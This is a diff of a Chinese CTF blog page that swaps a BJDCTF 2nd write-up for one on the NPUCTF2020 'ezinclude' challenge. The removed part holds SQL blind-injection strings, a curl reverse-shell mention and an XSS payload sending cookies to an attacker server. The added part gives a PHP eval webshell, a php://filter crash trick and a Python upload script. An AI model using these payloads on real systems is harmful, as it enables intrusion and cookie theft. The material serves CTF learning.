@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="[BJDCTF 2nd]部分wp, Z3ratu1&#39;s blog">
-    <meta name="description" content="[BJDCTF 2nd]部分wp据说是萌新赛，就目前做的几个题来说的确较为简单
-fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打SSTI上一次的BJDCTF也考过，具体判断什么的可以看上次比赛的WP">
+    <meta name="keywords" content="[NPUCTF2020]ezinclude, Z3ratu1&#39;s blog">
+    <meta name="description" content="[NPUCTF2020]ezinclude文件包含新知识，题目第一个点看的我莫名其妙的
+题解进来就是一句username/password error，源码里有一句注释&amp;lt;!–md5($secret.$name)===$pass –&amp;g">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +14,7 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>[BJDCTF 2nd]部分wp | Z3ratu1&#39;s blog</title>
+    <title>[NPUCTF2020]ezinclude | Z3ratu1&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -286,13 +286,13 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/note.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        [BJDCTF 2nd]部分wp
+                        [NPUCTF2020]ezinclude
                     </div>
                 </div>
             </div>
@@ -403,8 +403,8 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/wp/" target="_blank">
-                                <span class="chip bg-color">wp</span>
+                            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">
+                                <span class="chip bg-color">文件包含</span>
                             </a>
                         
                     </div>
@@ -427,21 +427,21 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-07-11
+                    2020-07-21
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        998
+                        610
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        3 Min
+                        2 Min
                     </div>
                     
                 
@@ -457,16 +457,21 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="BJDCTF-2nd-部分wp"><a href="#BJDCTF-2nd-部分wp" class="headerlink" title="[BJDCTF 2nd]部分wp"></a>[BJDCTF 2nd]部分wp</h1><p>据说是萌新赛，就目前做的几个题来说的确较为简单</p>
-<h2 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h2><p>SSTI，测一下可以发现用的jinja2，搜一个payload直接打<br>SSTI上一次的BJDCTF也考过，具体判断什么的可以看上次比赛的WP</p>
-<h2 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h2><p>ThinkPHP5，开了debug模式，随便触发一个错误看一眼thinkPHP版本，然后继续搜payload打</p>
-<h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><p>反弹shell，用了swp源码泄漏，过滤了重定向符&gt;，使得直接弹shell不行了，但是方法还是很多的，搜一下发现一个curl反弹的，在自己的机子上放一个文件里面写一个弹shell的语句就可以了<br><a href="https://www.cnblogs.com/-zhong/p/11398877.html" target="_blank" rel="noopener">https://www.cnblogs.com/-zhong/p/11398877.html</a></p>
-<p>师傅还提到一个用if语句类似盲注的方法可以把flag测出来</p>
-<h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>过滤了一大堆东西，<code>;=&#39;&quot;like select and &amp;&amp; or --</code>什么的都没了<br>说实话感觉很棘手，因为没有select就没法做绝大多数的注入了，而去掉了分号就没法堆叠注入，感觉一度陷入困境<br>但是今天又学习到了新知识，像<code>select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;</code>这种语句，我们可以username=\&amp;password=or sleep(5) #进行注入，<br>这样子原语句就变成了<code>select * from users where username=&#39;\&#39; and password=&#39;or sleep(5) # &#39;</code><br>这样子就有一个可以操控的注入点了<br>但是没有select仍然没法进行太多的操作，但是这里我们只需要获得一个password就可以了<br>发现or 后面的逻辑为true时是回显是BJD needs to be stronger，而为false时是xxx need girlfriend，就显然是一个盲注了<br>用<code>or ascii(substr(password,%s,1))&lt;%s #</code>这样子一句盲注就可以拿到密码，使用admin账户登录获得flag，这里注意substr不能从0开始，从1开始截取的才是第一位</p>
-<p>从这里开始后面的题都是比赛结束之后看的</p>
-<h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>不明所以的题名，还是个藏比，着实没意思<br>进去有登录框，登录admin会失败，剩下的随便登录，会回显登录的用户名，一开始想试ssti，或者注入，无果。<br>查看源码无果，扫描无果<br>最后看的wp，用burp抓包会在登录时有一个重定向，会告诉你一个隐藏的L0g1n.php （说实话感觉藏比题没意思）<br>进去之后是考http头的，萌新题，不过出现了两个没见过的http头<br>一个是要求你从localhost访问，但是不能用XFF，伪造remoteAddr显然不可能，所以找替代品Client-IP<br>要求使用Commodo 64的浏览器访问，查了半天还查不到是什么，最后看wp是一个叫Commodore 64的操作系统（为什么搜不到呢）<br>要求从某个邮箱访问：From<br>要求使用VPN：Via</p>
-<h2 id="element-master"><a href="#element-master" class="headerlink" title="element master"></a>element master</h2><p>藏，审查源码可以看到一个Po.php的ASCII码形式，访问之后得到一个点？？？？令人困惑<br>然后试着输入几个其他的化学元素，一开始使得H，O，之类的记得住的元素没反应，后来随手打了个Ar有反应了，发现靠后的元素会有其他的字符出现，随便写个脚本遍历元素周期表就可以了，得到一个PHP文件名，访问获得flag</p>
-<h2 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h2><p>又是藏，.git源码泄漏，用Githack拉下来，就给了一个<code>echo unserialize($a);</code>，那么思路就必然是原生类的反序列化了，稍微搜一下就你看见lemon神仙的一篇文章，exception类使用__toString的反序列化<br>刚好这个类可以xss，点题<br>但是我也不知道flag在哪啊，xss也不是很熟练，我知道的xss好像就盗cookie，那写一个payload把cookie发到自己服务器上就可以了<br>payload：<code>&lt;script&gt;document.write(&quot;&lt;img src=&#39;http://server:10004?c=&quot; + escape(document.cookie) + &quot;&#39;&gt;&quot;)&lt;/script&gt;</code></p>
+                <h1 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h1><p>文件包含新知识，题目第一个点看的我莫名其妙的</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>进来就是一句username/password error，源码里有一句注释&lt;!–md5($secret.$name)===$pass –&gt;也是看得人不明所以，也没说是post还是get传参，本来感觉应该是一个哈希扩展攻击，但是secret的长度未知，好像也没法进行。随便输了点东西之后给了我一个名字叫Hash的cookie，就直接把md5($secret.$name)给我了？？？把密码换成cookie值就可以了</p>
+<p>然后会给一个flflflflag.php，但是打开就重定向到404，所以还是用burp抓包<br>给了一个include $_GET[‘file’];简单测试之后，input，data等字段都给过滤了，还是没有想象中那么简单</p>
+<p>那么现在的想法就是去包含上传文件，有两种情况，在可以访问phpinfo的情况下，疯狂上传大文件，同时在phpinfo中可以看到上传的文件在tmp目录下的文件名，条件竞争，在文件被删除之前包含进来getshell；第二种就是今天的新知识点，通过include导致PHP崩溃，上传文件不被移除，遗留在tmp目录下，这种方法的问题在于不需要条件竞争，但是文件名为PHPxxxxxx，需要爆破文件名，后来看wp知道还有一个dir.php，作用就是var_dump(scandir(/tmp));</p>
+<p>到这里思路就很简单了，手搓一个文件上传，想办法引发PHP崩溃，去dir.php里面看上传的文件名，包含getshell</p>
+<p>php&lt;7.2时，include语句为php://filter/string.strip_tags/resource=/etc/passwd时可以引发PHP崩溃</p>
+<h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>文件上传不晓得咋整的，这次上传文件就着原来的脚本不能用了，报错<br>然后抄了一个脚本，如下形式上传文件</p>
+<pre class=" language-python"><code class="language-python">shell <span class="token operator">=</span> <span class="token string">"&lt;?php eval($_REQUEST['a']); ?>"</span>
+url <span class="token operator">=</span> <span class="token string">"http://983c44af-1a5b-48e8-bf90-a3d29458e7c4.node3.buuoj.cn/flflflflag.php"</span>
+files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span>shell<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+payload <span class="token operator">=</span> <span class="token string">"?file=php://filter/string.strip_tags/resource=/etc/passwd"</span>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span></code></pre>
+<p>原来的形式是files是一个列表，第一项是$_FILE这个全局数组的键名，第二项一个元组，内容是文件名和文件内容</p>
+<p>又flag在phpinfo中，一开始用了一下system发现没成，查了一下disable_function发现禁用了一堆，还以为又要bypass_disable_function</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>看到一个文件包含利用大全的总结，很强<br><a href="https://bbs.zkaq.cn/t/3639.html" target="_blank" rel="noopener">https://bbs.zkaq.cn/t/3639.html</a></p>
 
             </div>
             <hr/>
@@ -625,9 +630,9 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《[BJDCTF 2nd]部分wp》
+                    《[NPUCTF2020]ezinclude》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/07/11/%5BBJDCTF%202nd%5D%E9%83%A8%E5%88%86wp/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/07/21/%5BNPUCTF2020%5Dezinclude/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Z3ratu1
             </a> is licensed under a
@@ -667,30 +672,30 @@ fake googleSSTI，测一下可以发现用的jinja2，搜一个payload直接打S
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2020/07/11/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5D%20RCE%20ME/">
+                <a href="/2020/07/21/%5BNPUCTF2020%5Dezinclude/">
                     <div class="card-image">
                         
-                        <img src="/img/ctf1.jpg" class="responsive-img" alt="极客大挑战 RCE ME">
+                        <img src="/img/note.jpg" class="responsive-img" alt="[NPUCTF2020]ezinclude">
                         
-                        <span class="card-title">极客大挑战 RCE ME</span>
+                        <span class="card-title">[NPUCTF2020]ezinclude</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            极客大挑战 RCE ME三叶草招新赛里面一个比较难的题，无字母数字命令执行+bypass disable_function当时做的时候不会手搓上传就弃了，今天在buu上复现重做了一遍
-无字母数字命令执行&lt;?php
-error_repo
+                            [NPUCTF2020]ezinclude文件包含新知识，题目第一个点看的我莫名其妙的
+题解进来就是一句username/password error，源码里有一句注释&lt;!–md5($secret.$name)===$pass –&g
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-11
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -703,15 +708,12 @@ error_repo
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/RCE/" target="_blank">
-                        <span class="chip bg-color">RCE</span>
-                    </a>
-                    
-                    <a href="/tags/bypass-disable-function/" target="_blank">
-                        <span class="chip bg-color">bypass_disable_function</span>
+                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">
+                        <span class="chip bg-color">文件包含</span>
                     </a>
                     
                 </div>
@@ -725,24 +727,24 @@ error_repo
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/11/%5BSWPU2019%5DWeb4/">
+                <a href="/2020/07/21/%5BGWCTF%202019%5Dmypassword/">
                     <div class="card-image">
                         
-                        <img src="/img/php.jpg" class="responsive-img" alt="SWPU2019 Web4">
+                        <img src="/img/ctf.jpg" class="responsive-img" alt="[GWCTF 2019]mypassword">
                         
-                        <span class="card-title">SWPU2019 Web4</span>
+                        <span class="card-title">[GWCTF 2019]mypassword</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            [SWPU2019]Web4buu上的一分题，说实话这个难度我是不相信它只有一分的
-题解打开是一个登录框，简单测试发现添加单引号会出现一个PHP的报错，而不是MySQL的报错，存在注入点，但不可使用报错注入测了半天，感觉有关键词屏蔽，但是无
+                            [GWCTF 2019]mypassword一个XSS题，开局一个登录框，试了一下admin被注册了，过滤了一些东西，注册一个号登进去看发现并不是注入，给了一个feedback界面提交反馈，大概就能猜出来是XSS了
+题解在feedback界
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-11
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-21
                             </span>
                         <span class="publish-author">
                             
@@ -759,12 +761,8 @@ error_repo
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/SQLI/" target="_blank">
-                        <span class="chip bg-color">SQLI</span>
-                    </a>
-                    
-                    <a href="/tags/wp/" target="_blank">
-                        <span class="chip bg-color">wp</span>
+                    <a href="/tags/XSS/" target="_blank">
+                        <span class="chip bg-color">XSS</span>
                     </a>
                     
                 </div>
